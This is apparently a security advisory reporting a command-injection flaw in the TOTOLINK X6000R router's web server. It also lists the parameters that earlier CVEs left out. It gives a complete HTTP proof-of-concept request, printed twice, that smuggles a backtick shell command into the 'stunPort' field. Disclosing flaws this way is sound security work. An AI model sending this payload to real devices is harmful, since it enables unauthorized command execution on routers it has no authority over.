# Summary
There is a command execution vulnerability in TOTOLINK X6000R V9.4.0cu.852_B20230719(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is parameter **`stunPort`** of `sub_4119A0` function in `/usr/sbin/shttpd` binary file.

**Notice**:
I checked **all the currently disclosed CVEs** and found that the affected parameters in the currently exposed sub_4119A0 are:
- [ ] interval
- [ ] pass
- [ ] enable
- [ ] url
- [ ] informEnable
- [ ] user
- [ ] stun_user
- [ ] request_user
- [ ] request_pass
- [ ] stun_enable
- [ ] stunServerAddr

However, parameters
- [ ] **port**
- [ ] **stunPort**
- [ ] **stunMaxAlive**
- [ ] **stunMinAlive**

are ignored.

# Details
Funtion `sub_4119A0` get `stunPort` from user's input and use `Uci_Set_Str`, which leads to command execution:
![image](https://github.com/user-attachments/assets/0d38a7ea-02f2-4bbe-9df6-77a2f0291dcb)

`Uci_Set_Str`:
![image](https://github.com/user-attachments/assets/fec24bc9-d13a-4c0f-bcd0-57a605e68383)

`CsteSystem`:
![image](https://github.com/user-attachments/assets/c55d454e-996d-451d-b21a-837127736d69)

The corresponding front-end web interface is here:
![image](https://github.com/user-attachments/assets/12ba6593-3d59-4390-ad1b-fbf1e3d9d2a6)

Use burpsuite to intercept the packet, and modify the value of `stunPort`:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=FE46010A2414AC06 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 325
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/tr069_cfg.html?token=FE46010A2414AC06
Priority: u=1

{"addEffect":"0","enable":"1","url":"www.awa.com","user":"1","pass":"1","informEnable":"0","interval":"","requestUser":"","requestPass":"",
"port":"12",
"stun_user":"","stun_pass":"","stunEnable":"0","stunServerAddr":"","stunPort":"`ls > /web/poc_stunPort.txt`","stunMaxAlive":"","stunMinAlive":"","topicurl":"setTr069Cfg"}
```

![image](https://github.com/user-attachments/assets/2c48dc33-ced8-4b7d-a88d-df3c01e5c438)

![image](https://github.com/user-attachments/assets/20a7406d-397c-476a-8ef1-1f795c764090)


# PoC
Login first,
Use burpsuite to intercept the packet, and modify the value of `stunPort`:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=FE46010A2414AC06 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 325
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/tr069_cfg.html?token=FE46010A2414AC06
Priority: u=1

{"addEffect":"0","enable":"1","url":"www.awa.com","user":"1","pass":"1","informEnable":"0","interval":"","requestUser":"","requestPass":"",
"port":"12",
"stun_user":"","stun_pass":"","stunEnable":"0","stunServerAddr":"","stunPort":"`ls > /web/poc_stunPort.txt`","stunMaxAlive":"","stunMinAlive":"","topicurl":"setTr069Cfg"}
```

![image](https://github.com/user-attachments/assets/2c48dc33-ced8-4b7d-a88d-df3c01e5c438)

![image](https://github.com/user-attachments/assets/20a7406d-397c-476a-8ef1-1f795c764090)
